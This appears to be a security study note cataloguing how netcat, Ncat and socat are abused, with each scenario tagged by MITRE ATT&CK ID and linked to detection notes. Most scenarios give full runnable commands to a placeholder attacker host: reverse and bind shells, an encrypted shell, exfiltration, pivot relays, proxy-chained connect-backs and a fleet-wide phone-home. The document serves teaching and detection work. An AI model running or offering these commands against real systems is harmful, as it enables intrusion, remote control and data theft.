# LOLBins — Netcat / Ncat / Socat — Hands-On Use Cases

Descriptive header per scenario, MITRE ATT&CK ID(s) tagged per scenario, full runnable commands. `<attacker_ip>`/`<port>` are placeholders throughout. Where classic netcat, Ncat, and socat all support a scenario, each variant is shown so the differences are explicit rather than implied.

## Contents
- [Legacy `-e` Reverse Shell](#legacy--e-reverse-shell)
- [No-`-e` Reverse Shell via `mkfifo`](#no--e-reverse-shell-via-mkfifo)
- [Bind Shell](#bind-shell)
- [Ncat `--exec`/`--sh-exec` Execution](#ncat---exec---sh-exec-execution)
- [Ncat `--ssl` Encrypted Channel](#ncat---ssl-encrypted-channel)
- [Socat Fully-Interactive PTY Reverse Shell](#socat-fully-interactive-pty-reverse-shell)
- [Socat Bind Shell](#socat-bind-shell)
- [File Transfer — Download](#file-transfer--download)
- [File Transfer — Upload](#file-transfer--upload)
- [Port Scanning / Banner Grabbing](#port-scanning--banner-grabbing)
- [Relay / Pivot Chaining](#relay--pivot-chaining)
- [Ncat Proxy Chaining](#ncat-proxy-chaining)
- [Ncat Broker / Chat Relay Mode](#ncat-broker--chat-relay-mode)
- [UDP Variant](#udp-variant)
- [Fleet-Wide Mass Listener Push](#fleet-wide-mass-listener-push)
- [Legitimate-Baseline Sysadmin Use](#legitimate-baseline-sysadmin-use)

---

## Legacy `-e` Reverse Shell

**MITRE ATT&CK:** [T1095](https://attack.mitre.org/techniques/T1095/) (Non-Application Layer Protocol — C2 channel), [T1059.004](https://attack.mitre.org/techniques/T1059/004/) or [T1059.003](https://attack.mitre.org/techniques/T1059/003/) (the shell spawned as payload)

```sh
# Attacker — listener, waits for the target to connect out
nc -lvnp 4444

# Target — must be a build with -e compiled in (see 01 - Overview.md History)
nc <attacker_ip> 4444 -e /bin/sh
```

```cmd
:: Windows equivalent, using an nc.exe build that has -e enabled
nc.exe <attacker_ip> 4444 -e cmd.exe
```

The target-initiated outbound connection is what makes this the "reverse" shell — it's favored over a bind shell specifically because most egress firewall rules are far looser than ingress rules, so an outbound connection from the target is more likely to succeed unnoticed than an attacker connecting in.

## No-`-e` Reverse Shell via `mkfifo`

**MITRE ATT&CK:** T1095, T1059.004

```sh
rm -f /tmp/f; mkfifo /tmp/f
/bin/sh -i 2>&1 </tmp/f | nc <attacker_ip> <port> >/tmp/f
```

Functionally equivalent output to the `-e` version above, but works against OpenBSD `nc` and any traditional build compiled without `-DGAPING_SECURITY_HOLE` (see `01`'s History section — this is the majority case on current stock Linux distributions). The `/tmp/f` named pipe is a real, recoverable disk artifact this construction leaves behind — see `04 - Target Evidence.md`.

## Bind Shell

**MITRE ATT&CK:** T1095, T1059.003/T1059.004

```sh
# Target — listens locally and hands out a shell to whoever connects
nc -lvnp 4444 -e /bin/sh
```
```sh
# Attacker — connects in
nc <target_ip> 4444
```

The opposite direction from the reverse shell: the target is the listener. Requires the attacker be able to reach the target's chosen port inbound, which is why this pattern is used less than the reverse shell on any target sitting behind NAT/a restrictive firewall, but remains useful on a target with an open/reachable port or once a pivot is already established.

## Ncat `--exec`/`--sh-exec` Execution

**MITRE ATT&CK:** T1095, T1059.003/T1059.004

```sh
# Attacker listener (unchanged in spirit from plain nc)
ncat -lvnp 4444

# Target — -e/--exec binds the program directly
ncat <attacker_ip> 4444 -e /bin/sh
# --sh-exec runs the command through /bin/sh -c first, so shell metacharacters work
ncat <attacker_ip> 4444 --sh-exec "/bin/sh -i"
```

Same primitive as classic `-e`, but on a binary that is not subject to the `GAPING_SECURITY_HOLE` compile-time removal — Ncat always ships with `--exec`/`--sh-exec` available, which is part of why it's frequently the fallback of choice when a target's stock `nc` build has no `-e`.

## Ncat `--ssl` Encrypted Channel

**MITRE ATT&CK:** T1095, [T1573.002](https://attack.mitre.org/techniques/T1573/002/) (Encrypted Channel: Asymmetric Cryptography)

```sh
# Attacker listener — no cert supplied, Ncat auto-generates an ephemeral self-signed cert
ncat -lvnp 4444 --ssl

# Target
ncat <attacker_ip> 4444 --ssl --sh-exec "/bin/sh -i"
```

The entire session is TLS-wrapped with zero certificate-management effort on the operator's part (see `01`'s How It Works, point 5) — this defeats any network-detection approach relying on plaintext command/output signature matching, and blends the traffic's TLS handshake shape in among ordinary HTTPS on the wire. See `05 - Detection and Hunting.md` for how the *ephemeral, tool-generated* nature of the default certificate becomes the actual hunting signal that survives the encryption.

## Socat Fully-Interactive PTY Reverse Shell

**MITRE ATT&CK:** T1095, T1059.004

```sh
# Attacker — listener side; putting the operator's own terminal into raw mode
# so the remote PTY's control sequences (arrow keys, ^C, tab-completion) pass through cleanly
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Target — reconnects out, allocating a real PTY for the spawned shell
socat TCP:<attacker_ip>:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

This is the construction referenced in this note's red-flag callout — the only one of the three tools' shell primitives that produces a genuinely full-featured interactive terminal (job control, `^C` killing only the remote foreground process rather than the local listener, full-screen programs rendering correctly, `sudo` password prompts working). See `01`'s How It Works for what each `EXEC:` option does.

## Socat Bind Shell

**MITRE ATT&CK:** T1095, T1059.004

```sh
# Target — listens, forks a handler per connection, PTY-backed shell
socat TCP-LISTEN:4444,fork EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

# Attacker — connects in
socat file:`tty`,raw,echo=0 TCP:<target_ip>:4444
```

`fork` is what lets the listener keep accepting additional connections rather than exiting after the first — without it, a single accepted connection terminates the listener.

## File Transfer — Download

**MITRE ATT&CK:** [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer) or [T1041](https://attack.mitre.org/techniques/T1041/) (Exfiltration Over C2 Channel), depending on direction and intent

```sh
# Receiving end — listener writes whatever it receives straight to a file
nc -lvnp 4444 > received_file

# Sending end — streams a local file's bytes out over the connection
nc <receiver_ip> 4444 < file_to_send
```

```sh
# Ncat equivalent (identical redirection pattern)
ncat -lvnp 4444 > received_file
ncat <receiver_ip> 4444 < file_to_send
```

No protocol framing of any kind — the receiving side has no way to know the transfer finished except the sending side closing the connection (or a `-w`/timeout expiring), and no built-in integrity check; verify the transferred file's hash out-of-band if that matters.

## File Transfer — Upload

**MITRE ATT&CK:** T1105 or T1041, same distinction as above — same command shape, direction reversed relative to which host is "receiving." Included as its own entry because in a real intrusion the *listener* is just as often the attacker (pulling data off a target) as it is the target (receiving a dropped tool), and which direction is happening matters for classification: attacker listens + target sends = exfiltration (T1041); attacker listens + target requests = the target is pulling a tool in, which is really the mirror of the Download scenario above with roles reversed.

## Port Scanning / Banner Grabbing

**MITRE ATT&CK:** [T1046](https://attack.mitre.org/techniques/T1046/) (Network Service Discovery)

```sh
# Zero-I/O scan of a single port — reports open/closed, no data exchanged
nc -zv <target_ip> 4444

# Range scan
nc -zv <target_ip> 1-1000

# Banner grab — connect and read whatever the service sends first (many services
# announce a version string unprompted, e.g. SSH, SMTP, FTP)
nc -v <target_ip> 22
```

`-z` is netcat's own lightweight recon primitive — closes the connection immediately after establishing it rather than relaying any data, useful as a fast reachability check even outside a security context. This is also the single most common **legitimate** use of netcat in a sysadmin's own troubleshooting workflow (see Legitimate-Baseline Sysadmin Use below), which is exactly why `-zv` traffic alone is a weak detection signal on its own.

## Relay / Pivot Chaining

**MITRE ATT&CK:** [T1090.001](https://attack.mitre.org/techniques/T1090/001/) (Internal Proxy), [T1572](https://attack.mitre.org/techniques/T1572/) (Protocol Tunneling)

```sh
# Two-nc relay via a named pipe — bridges a connection arriving on port A
# to an outbound connection on port B, through a pivot host with no direct
# route from the original attacker to the final target
mkfifo /tmp/relay
nc -lvnp <listen_port> < /tmp/relay | nc <final_target_ip> <final_target_port> > /tmp/relay
```

```sh
# socat one-liner equivalent — no manual fifo needed, socat handles the
# bidirectional relay natively
socat TCP-LISTEN:<listen_port>,fork,reuseaddr TCP:<final_target_ip>:<final_target_port>
```

MITRE's own T1090.001 detection-strategy guidance names this exact pattern directly: *"socat, ssh, iptables, or ncat invoked from user space or cron jobs to create port forwarding, reverse shells, or inter-host tunnels between compromised Linux systems."* The socat one-liner is materially simpler and is why socat is generally favored for pivot/relay chaining over the manual two-`nc`-process fifo construction once it's available on the pivot host.

## Ncat Proxy Chaining

**MITRE ATT&CK:** T1090.001, [T1572](https://attack.mitre.org/techniques/T1572/)

```sh
# Route the connect-back through an existing SOCKS5 proxy rather than directly
ncat --proxy <proxy_host>:<proxy_port> --proxy-type socks5 <attacker_ip> <port> --sh-exec "/bin/sh -i"
```

Useful where a compromised host already has a proxy configured (or reachable) that ordinary traffic routes through — riding that existing egress path rather than opening a new, more conspicuous direct outbound connection.

## Ncat Broker / Chat Relay Mode

**MITRE ATT&CK:** T1095, T1090.001

```sh
# A rendezvous point multiple clients connect into; traffic between them
# is relayed, but the shape doesn't resemble a typical single reverse shell
ncat --broker --listen -p 4444

# Or the line-buffered chat variant
ncat --chat --listen -p 4444
```

Less commonly seen than a straightforward reverse/bind shell, but worth knowing as a distinct traffic pattern — a multi-client rendezvous/relay point can double as a crude C2 check-in channel precisely because its behavior (multiple simultaneous connections into one process, relayed among each other) doesn't match the single-attacker/single-target shape most reverse-shell detection logic assumes.

## UDP Variant

**MITRE ATT&CK:** T1095

```sh
# Any of the above patterns, forced to UDP with -u
nc -u -lvnp 4444
nc -u <attacker_ip> 4444 -e /bin/sh
```

Relevant specifically where a UDP-only egress path exists but TCP doesn't (some restrictive egress filtering is TCP-only), or where blending into legitimate UDP traffic (DNS-adjacent ports, etc.) is the goal. Note that UDP's connectionless nature means netcat/ncat's own "connection" state here is a local fiction — there's no handshake to confirm the other end is actually listening the way there is for TCP.

## Fleet-Wide Mass Listener Push

**MITRE ATT&CK:** T1095, [T1570](https://attack.mitre.org/techniques/T1570/) (Lateral Tool Transfer, if the binary itself is being pushed to each host)

```sh
# Issued identically across many already-compromised hosts via C2 tasking,
# each phoning home to the same attacker-held listener/broker on a staggered schedule
nc <attacker_ip> 4444 -e /bin/sh
```

The fleet-level signal is many hosts independently generating the same connect-out pattern to the same destination within a broad time window — see the fleet-wide sweep block in `05 - Detection and Hunting.md`.

## Legitimate-Baseline Sysadmin Use

Not an attack — included so an analyst can recognize the noise floor this technique has to hide in, and consistent with this module's SEC560-sourced note that netcat is genuinely taught for **banner grabbing, ad hoc file transfer, and pivoting** in legitimate network-troubleshooting contexts, not solely as offensive tooling:

```sh
# A network engineer confirming a service is actually listening on the expected port
nc -zv internal-app-server 8443

# An admin moving a config file between two boxes with no SCP/SFTP set up yet
nc -lvnp 9000 > config.tar.gz          # on the receiving box
nc receiving-box 9000 < config.tar.gz  # on the sending box
```

Same commands, same binary, same network signature as the early stage of several attack scenarios above — intent and follow-on behavior (see `05`'s hunting priority table) are what separate this from abuse, not the command itself.
